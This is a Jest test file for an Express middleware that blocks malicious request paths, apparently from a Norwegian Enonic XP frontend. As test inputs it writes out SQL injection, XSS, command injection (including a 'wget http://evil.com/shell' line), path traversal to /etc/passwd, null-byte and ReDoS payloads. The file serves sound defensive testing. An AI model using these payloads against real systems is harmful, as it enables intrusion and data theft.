import { Request, Response, NextFunction } from 'express';
import { buildPathValidationMiddleware } from './path-validation-middleware';
import { InferredNextWrapperServer } from '../server';

describe('Path Validation Middleware', () => {
    let mockNextApp: Pick<InferredNextWrapperServer, 'renderError'>;
    let mockRes: Partial<Response>;
    let nextFunction: NextFunction;
    let renderErrorSpy: jest.Mock;

    const createMockReq = (path: string): Partial<Request> => ({
        path,
        ip: '127.0.0.1',
        method: 'GET',
    });

    beforeEach(() => {
        jest.useFakeTimers();
        renderErrorSpy = jest.fn().mockResolvedValue(undefined);
        mockNextApp = { renderError: renderErrorSpy };
        mockRes = { statusCode: 200 };
        nextFunction = jest.fn();
    });

    afterEach(() => {
        jest.useRealTimers();
    });

    const runMiddleware = (path: string) => {
        const middleware = buildPathValidationMiddleware(mockNextApp as InferredNextWrapperServer, true);
        return middleware(createMockReq(path) as Request, mockRes as Response, nextFunction);
    };

    describe('Valid paths', () => {
        test('should allow normal path', () => {
            runMiddleware('/some/normal/path');
            expect(nextFunction).toHaveBeenCalled();
            expect(renderErrorSpy).not.toHaveBeenCalled();
        });

        test('should allow UUID', () => {
            runMiddleware('/123e4567-e89b-12d3-a456-426614174000');
            expect(nextFunction).toHaveBeenCalled();
        });

        test('should allow Norwegian characters', () => {
            runMiddleware('/æøå/test');
            expect(nextFunction).toHaveBeenCalled();
        });

        test('should allow valid XP image path with file', () => {
            runMiddleware('/_/image/123/file.jpg');
            expect(nextFunction).toHaveBeenCalled();
        });

        test('should allow valid XP attachment path with file', () => {
            runMiddleware('/_/attachment/inline/123/file.pdf');
            expect(nextFunction).toHaveBeenCalled();
        });
    });

    describe('Blocked Enonic XP root paths', () => {
        test('should block /_/image root path', () => {
            runMiddleware('/_/image');
            expect(mockRes.statusCode).toBe(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block /_/image/ root path with trailing slash', () => {
            runMiddleware('/_/image/');
            expect(mockRes.statusCode).toBe(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block /_/attachment root path', () => {
            runMiddleware('/_/attachment');
            expect(mockRes.statusCode).toBe(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block /_/attachment/ root path with trailing slash', () => {
            runMiddleware('/_/attachment/');
            expect(mockRes.statusCode).toBe(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block /_/component root path', () => {
            runMiddleware('/_/component');
            expect(mockRes.statusCode).toBe(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });
    });

    describe('SQL Injection attempts', () => {
        /* TODO: Fiks -- problemet fra frontend og gjeninnfør disse
        test('should block SQL injection with single quote', () => {
            const mockReq = createMockReq("/test' OR '1'='1");
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(mockRes.statusCode).toBe(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block SQL comment injection', () => {
            runMiddleware('/test--comment');
            expect(mockRes.statusCode).toBe(400);
        });
        */
        test('should block UNION SELECT', () => {
            runMiddleware('/test union select');
            expect(mockRes.statusCode).toBe(400);
        });

        /* TODO: Fiks -- problemet fra frontend og gjeninnfør denne
        test('should block encoded SQL injection', () => {
            runMiddleware('/test%27%20OR%201=1');
            expect(mockRes.statusCode).toBe(400);
        });
        */
    });

    describe('XSS attempts', () => {
        test('should block script tag', () => {
            runMiddleware('/<script>alert(1)</script>');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block encoded script tag', () => {
            runMiddleware('/%3Cscript%3Ealert(1)%3C/script%3E');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block img tag with onerror', () => {
            runMiddleware('/<img alt src="" onerror=alert(1)>');
            expect(mockRes.statusCode).toBe(400);
        });
    });

    describe('Command Injection attempts', () => {
        test('should block pipe character', () => {
            runMiddleware('/test | ls');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block backtick', () => {
            runMiddleware('/test`whoami`');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block shell command with arguments', () => {
            runMiddleware('/wget http://evil.com/shell');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block curl command', () => {
            runMiddleware('/curl -O malware');
            expect(mockRes.statusCode).toBe(400);
        });
    });

    describe('Path Traversal attempts', () => {
        test('should block directory traversal with ../', () => {
            runMiddleware('/../etc/passwd');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block directory traversal with ..\\', () => {
            runMiddleware('/..\\windows\\system32');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block access to /etc/passwd', () => {
            runMiddleware('/etc/passwd');
            expect(mockRes.statusCode).toBe(400);
        });
    });

    describe('Malicious file extensions', () => {
        test('should block .php files', () => {
            runMiddleware('/malicious.php');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block .exe files', () => {
            runMiddleware('/malware.exe');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block .sh files', () => {
            runMiddleware('/script.sh');
            expect(mockRes.statusCode).toBe(400);
        });
    });

    describe('DoS protection', () => {
        test('should block ReDoS exploit attempts efficiently', () => {
            // This path would cause exponential backtracking with vulnerable regex like /(.{10,})\1{3,}/
            // Pattern: equals sign followed by many characters without the expected closing delimiter
            const redosPayload = '/test=' + 'a'.repeat(500) + '!';

            const startTime = Date.now();
            runMiddleware(redosPayload);
            const duration = Date.now() - startTime;

            // Should complete in reasonable time (< 100ms) even with potentially malicious input
            expect(duration).toBeLessThan(100);
            // Should be blocked by repeated pattern check
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block ReDoS in union/select pattern efficiently', () => {
            // This would cause backtracking in /union.*select/i with many non-matching chars
            const redosPayload = '/union' + 'x'.repeat(500) + 'y';

            const startTime = Date.now();
            runMiddleware(redosPayload);
            const duration = Date.now() - startTime;

            expect(duration).toBeLessThan(100);
            // Should be blocked by repeated pattern check
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block ReDoS in XSS pattern with unclosed tag efficiently', () => {
            // Tests [^\n]+ patterns - opening tag without closing bracket
            const redosPayload = '/<img ' + 'x'.repeat(500);

            const startTime = Date.now();
            runMiddleware(redosPayload);
            const duration = Date.now() - startTime;

            expect(duration).toBeLessThan(100);
            // Should be blocked by repeated pattern check
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block ReDoS in SQL pattern with many word chars efficiently', () => {
            // Tests \w* possessive quantifier pattern
            const redosPayload = '/' + 'a'.repeat(500) + "'or";

            const startTime = Date.now();
            runMiddleware(redosPayload);
            const duration = Date.now() - startTime;

            expect(duration).toBeLessThan(100);
            // Should be blocked by SQL injection pattern
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block excessively long paths', () => {
            runMiddleware('/' + 'a'.repeat(2001));
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block repeated pattern attacks', () => {
            runMiddleware('/aaaaaaaaaaaaaaaaaaaaaaaaa'.repeat(10));
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block excessive path segments', () => {
            runMiddleware('/' + Array(51).fill('segment').join('/'));
            expect(mockRes.statusCode).toBe(400);
        });
    });

    describe('Null byte injection', () => {
        test('should block null byte in path', () => {
            runMiddleware('/test\0malicious');
            expect(mockRes.statusCode).toBe(400);
        });

        test('should block encoded null byte', () => {
            runMiddleware('/test%00malicious');
            expect(mockRes.statusCode).toBe(400);
        });
    });

    describe('Double encoding attacks', () => {
        /* TODO: Fiks -- problemet fra frontend og gjeninnfør denne
        test('should block double-encoded single quote', () => {
            // %2527 decodes to %27, which matches our pattern /%27/
            runMiddleware('/test%2527malicious');
            expect(mockRes.statusCode).toBe(400);
        });
         */

        test('should block double-encoded script tag', () => {
            // %253C decodes to %3C, which matches our pattern /%3C/
            runMiddleware('/%253Cscript%253E');
            expect(mockRes.statusCode).toBe(400);
        });
    });
});
